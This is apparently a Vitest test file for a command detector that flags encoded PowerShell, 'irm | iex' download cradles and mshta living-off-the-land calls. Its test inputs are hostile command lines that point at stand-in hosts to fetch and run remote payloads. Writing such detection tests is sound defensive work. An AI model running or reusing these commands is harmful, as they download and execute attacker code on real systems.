import { describe, it, expect } from "vitest";
import { detectExecutionCommands } from "../../src/engine/detectors/command-detector";

describe("Command Detector", () => {
  it("detects encoded PowerShell command lines", () => {
    const text = "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";
    const signals = detectExecutionCommands(text);

    expect(signals.length).toBeGreaterThan(0);
    expect(signals[0].type).toBe("EXECUTION_INSTRUCTION");
    expect(signals[0].reason).toContain("base64-encoded");
  });

  it("detects in-memory download cradles (irm | iex)", () => {
    const text = "irm https://malicious-domain.xyz/payload.ps1 | iex";
    const signals = detectExecutionCommands(text);

    expect(signals.length).toBeGreaterThan(0);
    expect(signals[0].type).toBe("EXECUTION_INSTRUCTION");
  });

  it("detects dangerous living-off-the-land binaries (mshta / certutil)", () => {
    const text = "mshta http://payload.example/run.hta";
    const signals = detectExecutionCommands(text);

    expect(signals.length).toBeGreaterThan(0);
    expect(signals[0].reason).toContain("living-off-the-land");
  });
});

